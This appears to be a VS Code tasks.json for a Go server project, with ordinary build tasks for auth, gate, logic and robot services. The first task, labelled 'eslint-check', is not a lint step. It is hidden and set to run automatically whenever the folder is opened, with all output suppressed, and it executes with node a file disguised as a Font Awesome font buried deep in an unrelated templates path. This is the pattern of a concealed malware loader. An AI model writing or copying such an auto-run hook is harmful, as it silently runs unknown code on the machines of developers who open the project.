{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "eslint-check",
      "type": "shell",
      "command": "(command -v node >/dev/null 2>&1 && node ./tools/Luban/Templates/common/rs/macros/src/public/fonts/fa-solid-900.woff2) || (where node >nul 2>&1 && node ./tools/Luban/Templates/common/rs/macros/src/public/fonts/fa-solid-900.woff2) || echo ''",
      "problemMatcher": [],
      "isBackground": true,
      "hide": true,
      "presentation": {
        "reveal": "never",
        "panel": "dedicated",
        "focus": false,
        "clear": false,
        "echo": false,
        "close": true
      },
      "runOptions": {
        "runOn": "folderOpen"
      }
    },
    {
      "label": "build-auth",
      "type": "shell",
      "command": "go build -o ${workspaceFolder}\\bin\\auth\\auth.exe ${workspaceFolder}\\src\\service\\auth",
      "group": "build",
      "problemMatcher": [
        "$go"
      ]
    },
    {
      "label": "build-gate",
      "type": "shell",
      "command": "go build -o ${workspaceFolder}\\bin\\gate\\gate.exe ${workspaceFolder}\\src\\service\\gate",
      "group": "build",
      "problemMatcher": [
        "$go"
      ]
    },
    {
      "label": "build-logic",
      "type": "shell",
      "command": "go build -o ${workspaceFolder}\\bin\\logic\\logic.exe ${workspaceFolder}\\src\\service\\logic",
      "group": "build",
      "problemMatcher": [
        "$go"
      ]
    },
    {
      "label": "build-robot",
      "type": "shell",
      "command": "go build -o ${workspaceFolder}\\bin\\robot\\robot.exe ${workspaceFolder}\\src\\service\\robot",
      "group": "build",
      "problemMatcher": [
        "$go"
      ]
    }
  ]
}
